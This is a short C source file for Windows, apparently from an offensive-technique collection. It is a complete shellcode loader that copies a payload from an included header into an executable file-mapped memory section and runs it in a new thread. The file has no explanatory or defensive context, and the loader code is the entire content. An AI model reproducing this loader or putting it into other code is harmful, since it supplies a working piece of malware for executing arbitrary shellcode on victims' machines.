#include <windows.h>
#include "../common/payload.h"
int main() {
    HANDLE hMap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, payload_len, NULL);
    void *exec = MapViewOfFile(hMap, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, payload_len);
    memcpy(exec, payload, payload_len);
    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
    WaitForSingleObject(th, INFINITE);
    UnmapViewOfFile(exec); CloseHandle(hMap);
    return 0;
}
